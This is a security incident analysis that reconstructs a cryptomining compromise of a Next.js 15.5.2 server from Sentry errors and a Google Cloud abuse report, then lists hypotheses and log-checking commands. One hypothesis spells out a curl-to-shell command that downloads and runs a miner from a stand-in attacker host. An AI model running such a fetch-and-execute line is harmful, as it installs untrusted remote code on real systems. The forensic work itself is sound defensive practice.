# Detailed Analysis of Security Incident

## Evidence Review

### Sentry Error #1: "Unexpected end of form"
```
Error: Unexpected end of form
URL: https://34.8.252.244/
Method: POST
Time: Dec 5, 2:16 PM PST
Browser: Firefox 134.0
```

**Analysis**:
- Attacker sending malformed multipart/form-data
- Next.js tried to parse it and failed
- **Result**: FAILED attack attempt (error thrown)

---

### Sentry Error #2: "spawnSync /bin/sh ETIMEDOUT"
```
Error: spawnSync /bin/sh ETIMEDOUT
URL: https://34.8.252.244/
Method: POST
Time: Dec 5, 12:35 PM PST
Stack: eval at <anonymous> (next-server/app-page.runtime.prod.js)
       -> Object.spawnSync (node:internal/child_process)
```

**Analysis**:
- Code injection into Next.js's `eval()` function
- Injected code attempted: `spawnSync('/bin/sh', ...)`
- Got ETIMEDOUT error
- **Result**: PARTIALLY successful - code executed but timed out

**Critical Detail**: The fact that `spawnSync` was called AT ALL means:
- ✅ Code injection succeeded
- ✅ Shell spawn was attempted
- ❌ Shell process timed out (30 seconds?)
- ❓ Might have executed something before timeout

---

### Sentry Error #3: "SyntaxError: missing ) after argument list"
```
SyntaxError: missing ) after argument list
URL: https://34.8.252.244/
Method: POST
Time: Dec 5, 12:27 PM PST
User-Agent: Python Requests 2.31
Stack: Object.Function [as get] -> eval
```

**Analysis**:
- JavaScript injection attempt with malformed syntax
- Tried to inject code via `Function()` or `eval()`
- Syntax error means injection failed
- **Result**: FAILED attack attempt

---

### Google Cloud Abuse Report
```
Mining Activity Detected:
Source: 169.254.8.1 (Cloud Run internal IP)
Destination: 37.114.37.82, 37.114.37.94 (mining pools)
Port: 80
Time: Dec 5, 12:40-13:05 PM PST (25 minutes)
Project: bvgs-prod
```

**Analysis**:
- Mining started at **12:40 PM** (5 minutes after spawnSync error)
- Ran for 25 minutes before Google detected it
- Used port 80 (HTTP) to evade detection

---

## Timeline Reconstruction

| Time | Event | Status |
|------|-------|--------|
| 12:27 PM | JS injection attempt | ❌ Failed (syntax error) |
| 12:35 PM | Shell injection via eval | ⚠️ Partial (timeout) |
| 12:40 PM | **Mining starts** | ✅ Running |
| 13:05 PM | **Mining detected by Google** | 🛑 Stopped |
| 2:16 PM | Form data injection | ❌ Failed |

---

## Critical Question: How Did Mining Start?

The **"spawnSync /bin/sh ETIMEDOUT"** error is the smoking gun.

### Hypothesis 1: Timeout = Success
The ETIMEDOUT might mean:
1. `spawnSync('/bin/sh', ['-c', 'curl attacker.com/miner.sh | sh'])` executed
2. Started downloading miner
3. Timed out after 30 seconds (Next.js timeout)
4. **BUT** the background process kept running
5. Miner downloaded and started at 12:40 PM

### Hypothesis 2: Second Successful Attack
- The 12:35 PM attempt failed (timeout)
- Attacker tried again (not logged in Sentry)
- Second attempt succeeded silently
- Started mining at 12:40 PM

### Hypothesis 3: Different Attack Vector
- These Sentry errors are noise/distraction
- Real attack was through different endpoint
- Mining unrelated to these errors

---

## What We DON'T See in Logs

**Missing evidence:**
- ❌ No Sentry error at 12:40 PM (when mining started)
- ❌ No successful exploit log
- ❌ No download/install logs for mining software
- ❌ No Cloud Run logs analyzed yet

**This could mean:**
- Successful exploits don't throw errors
- Mining payload executed silently
- Need to check Cloud Run logs for full picture

---

## Code Injection Analysis

### How did code get into eval()?

Looking at the stack trace:
```
eval at <anonymous> (/app/node_modules/next/dist/compiled/next-server/app-page.runtime.prod.js:5:55270)
```

**Possible injection points:**
1. **POST body** → parsed as JSON → passed to eval()
2. **Headers** → unsanitized → passed to eval()
3. **URL parameters** → processed → eval'd
4. **Form fields** → multipart parser → eval'd

Next.js doesn't normally eval POST data, so this suggests:
- A vulnerability in Next.js 15.5.2
- OR injection through a dependency
- OR custom code using eval (none found in our codebase)

---

## Verification Needed

### Check Cloud Run Logs:
```bash
gcloud logging read "resource.type=cloud_run_revision AND
  resource.labels.service_name=bvgs-frontend AND
  timestamp>=\"2025-12-05T12:30:00Z\" AND
  timestamp<=\"2025-12-05T13:10:00Z\"" \
  --limit=500 \
  --format=json > incident_logs.json
```

**Look for:**
- Outbound HTTP connections to 37.114.37.*
- Process creation logs
- CPU spike at 12:40 PM
- Download activity (wget, curl)
- Successful POST requests (no error)

### Check Container Image:
```bash
# Pull production image
docker pull us-central1-docker.pkg.dev/bvgs-prod/bvgs-containers/bvgs-frontend-next:latest

# Check for persistence
docker run --rm -it [image] sh -c "crontab -l; ls -la /tmp /var/tmp; ps aux"
```

### Check for Next.js Vulnerability:
- Next.js version: 15.5.2
- Search: "Next.js 15.5.2 RCE" or "Next.js eval vulnerability"
- Check: https://github.com/vercel/next.js/security/advisories

---

## Revised Incident Assessment

### Confidence Levels:

**HIGH Confidence (90%+):**
- ✅ Attacker IP 34.8.252.244 made multiple attack attempts
- ✅ Mining occurred from your server 12:40-13:05 PM
- ✅ Code injection partially succeeded (spawnSync was called)

**MEDIUM Confidence (70%):**
- ⚠️ The spawnSync timeout was the successful exploit
- ⚠️ Mining payload executed in background after timeout
- ⚠️ No persistent backdoor in Docker image

**LOW Confidence (30%):**
- ❓ How exactly did code get into eval()
- ❓ What command was passed to spawnSync
- ❓ Where mining binary was downloaded from

---

## Conclusion

**What definitely happened:**
1. Attacker probed for vulnerabilities via POST to /
2. Code injection succeeded enough to call spawnSync
3. Mining occurred for 25 minutes shortly after

**What probably happened:**
1. spawnSync executed shell command despite timeout error
2. Background mining process started
3. Connected to mining pools and ran until detected

**What we need to confirm:**
1. Check Cloud Run logs for outbound connections
2. Verify no persistent backdoor in image
3. Understand exact injection mechanism

**Current status:**
- ✅ Fix implemented (blocks POST to /)
- ❌ Not deployed yet (still vulnerable)
- ⚠️ Secrets exposed (need rotation)
- ⚠️ Root cause unclear (eval injection path unknown)
